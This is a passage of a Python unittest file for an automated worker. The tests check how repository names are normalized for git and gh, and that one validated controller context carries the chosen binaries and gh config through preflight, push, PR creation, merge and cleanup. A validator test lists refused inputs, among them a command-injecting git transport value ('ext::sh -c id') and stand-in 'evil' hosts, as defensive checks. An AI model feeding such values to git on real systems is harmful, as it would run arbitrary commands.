                         "repair_enabled=false must still be honored")


class RepoNormalizationTests(unittest.TestCase):
    """git wants a transport, gh wants OWNER/REPO, and they are not the same
    string. A configured https url passed the auth preflight and then died at
    `gh pr create --repo https://...` (#1)."""

    def norm(self, repo):
        return EW.normalize_repo(repo, {})

    def test_owner_name_is_already_the_gh_form(self):
        r = self.norm("kody-w/public-art-collective")
        self.assertEqual("kody-w/public-art-collective", r.gh)
        self.assertEqual("https://github.com/kody-w/public-art-collective.git",
                         r.transport)
        self.assertEqual(("kody-w", "public-art-collective", "github.com"),
                         (r.owner, r.name, r.host))
        self.assertFalse(r.is_local)

    def test_an_https_url_becomes_the_gh_form(self):
        r = self.norm("https://github.com/kody-w/public-art-collective")
        self.assertEqual("kody-w/public-art-collective", r.gh)
        self.assertEqual("https://github.com/kody-w/public-art-collective",
                         r.transport)

    def test_a_dot_git_suffix_is_dropped_for_gh_but_kept_for_git(self):
        r = self.norm("https://github.com/kody-w/public-art-collective.git")
        self.assertEqual("kody-w/public-art-collective", r.gh,
                         "gh rejects a name ending in .git")
        self.assertTrue(r.transport.endswith(".git"),
                        "the transport url is left exactly as configured")

    def test_a_non_github_host_keeps_the_host_in_the_gh_name(self):
        r = EW.normalize_repo("https://ghe.example.com/team/art",
                              {"allowed_repo_hosts": ["ghe.example.com"]})
        self.assertEqual("ghe.example.com/team/art", r.gh)

    def test_a_local_path_has_no_gh_name(self):
        SCRATCH.mkdir(parents=True, exist_ok=True)
        d = SCRATCH / f"norm-{uuid.uuid4().hex[:8]}"
        d.mkdir()
        self.addCleanup(shutil.rmtree, d, True)
        origin = d / "origin.git"
        git(d, "init", "--bare", "-b", "main", str(origin))
        r = self.norm(str(origin))
        self.assertTrue(r.is_local)
        self.assertIsNone(r.gh)

    def test_invalid_forms_are_refused(self):
        for bad in ("ssh://evil/x", "git@github.com:kody-w/art.git",
                    "https://github.com/onlyowner", "ext::sh -c id",
                    "https://evil.example.com/a/b", "", "   ", "a/b/c/d"):
            with self.assertRaises((EW.GateError, EW.CommandError), msg=bad):
                self.norm(bad)


class ControllerContextTests(ScratchCase):
    """One validated set of choices for the whole pass. A preflight that
    validates one gh and a merge that resolves another is two decisions
    wearing one name (#2)."""

    def setUp(self):
        super().setUp()
        self.fakebin = self.home / "bin"
        self.fakebin.mkdir()
        self.log = self.home / "calls.log"
        for name in ("git", "gh"):
            b = self.fakebin / name
            b.write_text(f'#!/bin/sh\necho "{name} $*" >> "{self.log}"\n'
                         f'exit 0\n', encoding="utf-8")
            b.chmod(0o755)
        self.ghconfig = self.home / "ghconfig"
        self.ghconfig.mkdir(mode=0o700)
        (self.ghconfig / "hosts.yml").write_text("github.com:\n", encoding="utf-8")
        self.wcfg = dict(EW.worker_config({}),
                         repo="kody-w/public-art-collective",
                         git_binary=str(self.fakebin / "git"),
                         gh_binary=str(self.fakebin / "gh"),
                         gh_config_dir=str(self.ghconfig),
                         trusted_bin_roots=[str(self.fakebin)])

    def fresh(self):
        return mock.patch.object(EW, "_CTX_CACHE", {})

    def test_the_context_pins_the_configured_binaries_once(self):
        with self.fresh():
            ctx = EW.controller_for(self.wcfg)
        self.assertEqual(str(self.fakebin / "git"), ctx.git_path)
        self.assertEqual(str(self.fakebin / "gh"), ctx.gh_path)
        self.assertEqual("kody-w/public-art-collective", ctx.gh_repo())
        self.assertEqual(str(self.ghconfig), ctx.gh_env["GH_CONFIG_DIR"])

    def test_a_context_is_not_reused_across_a_changed_environment(self):
        with self.fresh():
            first = EW.controller_for(self.wcfg)
            with mock.patch.dict(os.environ, {"PATH": "/nowhere"}):
                second = EW.controller_for(self.wcfg)
        self.assertIsNot(first, second,
                         "a cached context must not survive a changed PATH")

    def test_the_same_context_serves_preflight_push_pr_and_cleanup(self):
        """Every subprocess in a pass must reach the same chosen binaries."""
        argvs = []
        real_run = subprocess.run

        def record(argv, *a, **kw):
            argvs.append((list(argv), (kw.get("env") or {}).get("GH_CONFIG_DIR")))
            if argv[0].endswith("/gh"):
                return subprocess.CompletedProcess(
                    argv, 0, stdout='{"viewerPermission": "ADMIN"}', stderr="")
            if len(argv) > 1 and argv[1] == "credential":
                return subprocess.CompletedProcess(
                    argv, 0, stdout="username=u\npassword=p\n", stderr="")
            return subprocess.CompletedProcess(argv, 0, stdout="", stderr="")

        with self.fresh():
            ctx = EW.controller_for(self.wcfg)
            with mock.patch.object(EW.subprocess, "run", record):
                EW.assert_publish_auth(self.wcfg, ctx=ctx)
                EW._git(self.home, "push", "origin", "art/x", ctx=ctx)
                EW._gh("pr", "create", "--repo", ctx.gh_repo(), ctx=ctx)
                EW._gh("pr", "merge", "1", "--repo", ctx.gh_repo(), ctx=ctx)
                EW._git(self.home, "push", "origin", "--delete", "art/x",
                        ctx=ctx)
        binaries = {argv[0] for argv, _ in argvs}
        self.assertEqual({str(self.fakebin / "git"), str(self.fakebin / "gh")},
                         binaries,
                         "a call escaped the context and resolved its own "
                         "binary")
        gh_calls = [(argv, cfg) for argv, cfg in argvs
                    if argv[0].endswith("/gh")]
        self.assertTrue(gh_calls)
        for argv, cfg in gh_calls:
            self.assertEqual(str(self.ghconfig), cfg,
                             f"{argv} did not use the validated gh config")


class NormalizedRepoCycleTests(WorkerEnv):
    """What gh and git are actually handed during a whole pass (#1, #2)."""

    def test_every_gh_call_uses_the_normalized_name(self):
        seen = []
        gh = self.gh
        origin = str(self.origin)

        def recording_gh(*args, timeout=None, wcfg=None, ctx=None):
            if "--repo" in args:
                seen.append(args[args.index("--repo") + 1])
            return gh(*args, timeout=timeout, ctx=ctx)

        # configured as a url, which is what broke the live cycle
        self.cfg["evolve_worker"]["repo"] = origin
        with mock.patch.object(EW, "_gh", recording_gh), \
             mock.patch.object(EW, "run_model", self.model_that_submits()):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual(EW.OUTCOME_CONTRIBUTED, summary["outcome"], summary)
        self.assertTrue(seen, "no gh --repo call was made")
        self.assertEqual(1, len(set(seen)),
                         f"gh was handed more than one repository name: "
                         f"{sorted(set(seen))}")

    def test_a_pass_builds_one_controller_and_threads_it(self):
        """Every call site after the first must accept the context it is
        given rather than resolving its own."""
        built = []
        real = EW.controller_for

        def counting(wcfg=None, git_home=None):
            ctx = real(wcfg, git_home)
            built.append(ctx)
            return ctx

        with mock.patch.object(EW, "controller_for", counting), \
             mock.patch.object(EW, "run_model", self.model_that_submits()):
            summary = EW.run_once(cfg=self.cfg, health=lambda phase: healthy())
        self.assertEqual(EW.OUTCOME_CONTRIBUTED, summary["outcome"], summary)
        self.assertEqual(1, len(built),
                         f"the pass built {len(built)} controllers; a call "
                         f"site dropped the threaded context")


if __name__ == "__main__":
    unittest.main()
